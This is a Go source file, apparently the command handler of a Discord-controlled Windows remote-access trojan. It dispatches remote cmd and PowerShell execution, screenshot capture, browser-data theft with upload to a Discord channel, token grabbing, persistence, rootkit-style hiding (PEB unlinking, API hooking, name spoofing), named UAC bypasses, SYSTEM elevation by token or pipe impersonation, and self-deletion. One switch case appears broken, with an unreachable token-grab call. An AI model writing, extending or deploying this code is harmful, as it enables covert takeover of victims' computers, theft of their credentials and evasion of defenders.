package handlers

import (
	"context"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"time"

	"github.com/bwmarrin/discordgo"
)

type Manager struct {
	persistence *PersistenceManager
	system      *SystemManager
	stealth     *StealthManager
	privesc     *PrivilegeManager
}

func NewManager() *Manager {
	return &Manager{
		persistence: NewPersistenceManager(),
		system:      NewSystemManager(),
		stealth:     NewStealthManager(),
		privesc:     NewPrivilegeManager(),
	}
}

func (m *Manager) Execute(ctx context.Context, command string, args []string, session *discordgo.Session, channelID string) string {
	argStr := strings.Join(args, " ")

	switch command {
	case "cmd":
		if argStr == "" {
			return "⚠ Usage: !cmd <command>"
		}
		return m.system.ExecuteCMD(ctx, argStr)

	case "shell", "ps":
		if argStr == "" {
			return "⚠ Usage: !shell <command>"
		}
		return m.system.ExecutePowerShell(ctx, argStr)

	case "screen":
		return m.handleScreenshot(ctx, session, channelID)

	case "persist", "persistence":
		return m.persistence.EnsureAll()

	case "hide", "rootkit":
		return m.handleStealth(ctx, args)

	case "stealth":
		return m.handleStealthStatus(ctx)
		return m.handleTokenGrab(ctx)

	case "browser", "browserdata":
		return m.handleBrowserData(ctx, session, channelID)

	case "admin", "elevate", "uac":
		return m.handleUACBypass(ctx, args)

	case "system", "nt", "authority":
		return m.handleSystemElevation(ctx, args)

	case "privs", "whoami":
		return m.handlePrivilegeCheck(ctx)

	case "exit", "kill":
		return m.handleSelfDestruct(ctx)

	default:
		return ""
	}
}

func (m *Manager) EnsurePersistence() string {
	return m.persistence.EnsureAll()
}

func (m *Manager) handleScreenshot(ctx context.Context, session *discordgo.Session, channelID string) string {
	filePath, err := m.system.TakeScreenshot()
	if err != nil {
		return fmt.Sprintf("⚠ Screenshot failed: %v", err)
	}
	defer os.Remove(filePath)

	file, err := os.Open(filePath)
	if err != nil {
		return fmt.Sprintf("⚠ Error opening screenshot: %v", err)
	}
	defer file.Close()

	session.ChannelMessageSendComplex(channelID, &discordgo.MessageSend{
		Content: "📸 **Screenshot:**",
		Files: []*discordgo.File{
			{
				Name:        "screenshot.png",
				ContentType: "image/png",
				Reader:      file,
			},
		},
	})

	return ""
}

func (m *Manager) handleTokenGrab(ctx context.Context) string {
	return GrabTokens()
}

func (m *Manager) handleBrowserData(ctx context.Context, session *discordgo.Session, channelID string) string {
	filePath, summary := StealBrowserData()
	if filePath != "" {
		file, err := os.Open(filePath)
		if err != nil {
			return fmt.Sprintf("⚠ Error opening ZIP: %v", err)
		}
		defer file.Close()
		defer os.Remove(filePath)

		session.ChannelMessageSendComplex(channelID, &discordgo.MessageSend{
			Content: summary,
			Files: []*discordgo.File{
				{
					Name:        filepath.Base(filePath),
					ContentType: "application/zip",
					Reader:      file,
				},
			},
		})
		return ""
	}
	return summary
}

func (m *Manager) handleUACBypass(ctx context.Context, args []string) string {
	if m.privesc.IsAdmin() {
		return "🔑 Already running with administrator privileges"
	}

	// if no method specified, try all methods
	if len(args) == 0 {
		if m.privesc.BypassUAC() {
			return "✅ UAC bypass successful - elevated to administrator"
		}
		return "❌ UAC bypass failed - all methods unsuccessful"
	}

	// try specific method
	method := strings.ToLower(args[0])
	var success bool
	var methodName string

	switch method {
	case "fodhelper", "fod":
		success = m.privesc.fodhelperBypass()
		methodName = "fodhelper"
	case "eventvwr", "event":
		success = m.privesc.eventvwrBypass()
		methodName = "eventvwr"
	case "sdclt", "sdc":
		success = m.privesc.sdcltBypass()
		methodName = "sdclt"
	case "computerdefaults", "comp", "defaults":
		success = m.privesc.computerDefaultsBypass()
		methodName = "computerdefaults"
	default:
		return fmt.Sprintf("❌ Unknown UAC bypass method: %s\nAvailable: fodhelper, eventvwr, sdclt, computerdefaults", method)
	}

	if success {
		time.Sleep(5 * time.Second)
		if m.privesc.IsAdmin() {
			return fmt.Sprintf("✅ UAC bypass successful using %s method - elevated to administrator", methodName)
		}
		return fmt.Sprintf("⚠ %s method triggered but elevation not confirmed", methodName)
	}

	return fmt.Sprintf("❌ UAC bypass failed using %s method", methodName)
}

func (m *Manager) handleSystemElevation(ctx context.Context, args []string) string {
	if !m.privesc.IsAdmin() {
		return "❌ Cannot elevate to SYSTEM - administrator privileges required first"
	}

	// if no method specified, try all methods
	if len(args) == 0 {
		if m.privesc.ElevateToSystem() {
			return "🔥 Successfully elevated to NT AUTHORITY\\SYSTEM"
		}
		return "❌ SYSTEM elevation failed - all methods unsuccessful"
	}

	// try specific method
	method := strings.ToLower(args[0])
	var success bool
	var methodName string

	switch method {
	case "pipe", "namedpipe", "impersonation":
		success = m.privesc.namedPipeImpersonation()
		methodName = "named pipe impersonation"
	case "token", "duplication", "steal":
		success = m.privesc.tokenDuplicationAttack()
		methodName = "token duplication"
	case "task", "scheduled", "schtasks":
		success = m.privesc.scheduleTaskAttack()
		methodName = "scheduled task"
	default:
		return fmt.Sprintf("❌ Unknown SYSTEM elevation method: %s\nAvailable: pipe, token, task", method)
	}

	if success {
		return fmt.Sprintf("🔥 Successfully elevated to NT AUTHORITY\\SYSTEM using %s method", methodName)
	}

	return fmt.Sprintf("❌ SYSTEM elevation failed using %s method", methodName)
}

func (m *Manager) handleStealth(ctx context.Context, args []string) string {
	// if no method specified, activate all stealth methods
	if len(args) == 0 {
		if m.stealth.ActivateAllMethods() {
			return "🔒 Stealth mode fully activated - all methods enabled"
		}
		return "⚠ Stealth activation partially successful - some methods may have failed"
	}

	// try specific method
	method := strings.ToLower(args[0])
	var success bool
	var methodName string

	switch method {
	case "peb", "hide", "unlink":
		success = m.stealth.ActivatePEBHiding()
		methodName = "PEB unlinking"
	case "hook", "api", "hooks":
		success = m.stealth.ActivateAPIHooking()
		methodName = "API hooking"
	case "spoof", "name", "names":
		success = m.stealth.ActivateNameSpoofing()
		methodName = "name spoofing"
	case "all", "full", "complete":
		success = m.stealth.ActivateAllMethods()
		methodName = "all methods"
	case "status", "info", "check":
		return m.handleStealthStatus(ctx)
	default:
		return fmt.Sprintf("❌ Unknown stealth method: %s\nAvailable: peb, hook, spoof, all, status", method)
	}

	if success {
		return fmt.Sprintf("🔒 Stealth activated using %s method", methodName)
	}

	return fmt.Sprintf("❌ Stealth activation failed using %s method", methodName)
}

func (m *Manager) handleStealthStatus(ctx context.Context) string {
	hidden, status := m.stealth.GetStatus()
	hooks := m.stealth.GetActiveHooks()

	var result strings.Builder
	result.WriteString("🔒 **Stealth Status:**\n")

	if hidden {
		result.WriteString("**Overall**: ✅ HIDDEN\n")
	} else {
		result.WriteString("**Overall**: ❌ VISIBLE\n")
	}

	if status["peb_hidden"] {
		result.WriteString("**PEB Hiding**: ✅ Active\n")
	} else {
		result.WriteString("**PEB Hiding**: ❌ Inactive\n")
	}

	if status["api_hooked"] {
		result.WriteString(fmt.Sprintf("**API Hooks**: ✅ Active (%d hooks)\n", hooks))
	} else {
		result.WriteString("**API Hooks**: ❌ Inactive\n")
	}

	if status["names_spoofed"] {
		result.WriteString("**Name Spoofing**: ✅ Active\n")
	} else {
		result.WriteString("**Name Spoofing**: ❌ Inactive\n")
	}

	return result.String()
}

func (m *Manager) handlePrivilegeCheck(ctx context.Context) string {
	var status strings.Builder

	if m.privesc.IsAdmin() {
		status.WriteString("🔑 **Administrator**: Yes\n")
	} else {
		status.WriteString("⚠ **Administrator**: No\n")
	}

	hostname, _ := os.Hostname()
	username := os.Getenv("USERNAME")
	domain := os.Getenv("USERDOMAIN")

	whoamiResult := m.system.ExecuteCMD(ctx, "whoami /all")

	status.WriteString(fmt.Sprintf("**Host**: %s\n", hostname))
	status.WriteString(fmt.Sprintf("**User**: %s\\%s\n", domain, username))
	status.WriteString("**Detailed Info**:\n")

	if len(whoamiResult) > 1000 {
		status.WriteString(whoamiResult[:1000] + "... (truncated)")
	} else {
		status.WriteString(whoamiResult)
	}

	return status.String()
}

func (m *Manager) handleSelfDestruct(ctx context.Context) string {
	m.persistence.RemoveAll()

	go func() {
		time.Sleep(3 * time.Second)

		exePath, _ := os.Executable()
		cmd := fmt.Sprintf(`timeout /t 2 /nobreak > nul && del /f /q "%s" 2>nul`, exePath)
		m.system.ExecuteCMD(context.Background(), cmd)

		os.Exit(0)
	}()

	return "💥 Self-destruct initiated. Cleaning traces..."
}
